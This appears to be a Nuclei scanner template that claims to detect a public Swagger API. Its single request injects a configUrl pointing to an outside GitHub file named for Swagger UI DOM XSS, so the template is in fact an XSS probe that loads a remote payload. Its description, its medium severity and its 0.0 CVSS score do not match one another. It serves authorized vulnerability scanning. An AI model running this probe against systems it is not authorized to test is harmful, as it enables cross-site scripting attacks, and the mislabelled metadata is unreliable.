id: swagger-api-custom

info:
  name: Public Swagger API - Detect
  author: pdteam,c-sh0
  severity: medium
  description: Public Swagger API was detected.
  reference: https://swagger.io/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N
    cvss-score: 0.0
    cwe-id: CWE-200
  metadata:
    verified: true
    shodan-query: http.title:"swagger"
  tags: exposure,api,swagger

requests:
  - method: GET
    path:
      - "{{BaseURL}}/swagger-ui/swagger-ui.js?configUrl=https://raw.githubusercontent.com/itsbalvant/Swagger-UI-DOM-XSS/main/swagger.json"
